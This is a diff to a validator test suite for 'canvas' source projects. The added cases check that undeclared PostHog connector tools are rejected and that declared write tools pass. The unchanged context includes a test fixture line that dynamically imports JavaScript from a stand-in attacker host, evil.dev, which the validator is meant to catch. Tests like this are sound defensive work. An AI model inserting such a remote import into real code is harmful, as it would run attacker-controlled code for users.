@@ -175,6 +175,24 @@ class TestCanvasSourceAdapter(SimpleTestCase):
                 ),
                 "connector_tool_not_registered",
             ),
+            *[
+                (
+                    f"posthog_tool_{name}",
+                    project(
+                        capabilities={
+                            "posthog": {},
+                            "network": {"origins": []},
+                            "connectors": [{"provider": "posthog", "tools": ["feature-flag-get-definition", tool]}],
+                        }
+                    ),
+                    "connector_tool_not_registered",
+                )
+                for name, tool in [
+                    ("unknown", "feature-flag-delete-everything"),
+                    ("superseded", "notebooks-create"),
+                    ("organization_scoped", "organizations-get"),
+                ]
+            ],
             (
                 "dynamic_import",
                 project(files={CANVAS_COMPONENT_PATH: 'const m = await import("https://evil.dev/x.js");'}),
@@ -280,6 +298,25 @@ class TestCanvasSourceAdapter(SimpleTestCase):
     )
     def test_platform_token_uses_and_mentions_pass(self, _name: str, path: str, content: str) -> None:
         candidate = project(files={CANVAS_COMPONENT_PATH: CODE, path: content})
+        self.assertEqual(validate_source_project(candidate), [])
+
+    def test_declared_posthog_tools_including_writes_pass(self):
+        candidate = project(
+            files={
+                CANVAS_COMPONENT_PATH: CODE
+                + 'ph.connectors.call("posthog", "feature-flag-set-release-condition-rollout", {});'
+            },
+            capabilities={
+                "posthog": {},
+                "network": {"origins": []},
+                "connectors": [
+                    {
+                        "provider": "posthog",
+                        "tools": ["feature-flag-get-definition", "feature-flag-set-release-condition-rollout"],
+                    }
+                ],
+            },
+        )
         self.assertEqual(validate_source_project(candidate), [])
 
     @parameterized.expand([("same_file", True), ("capabilities_only", False)])
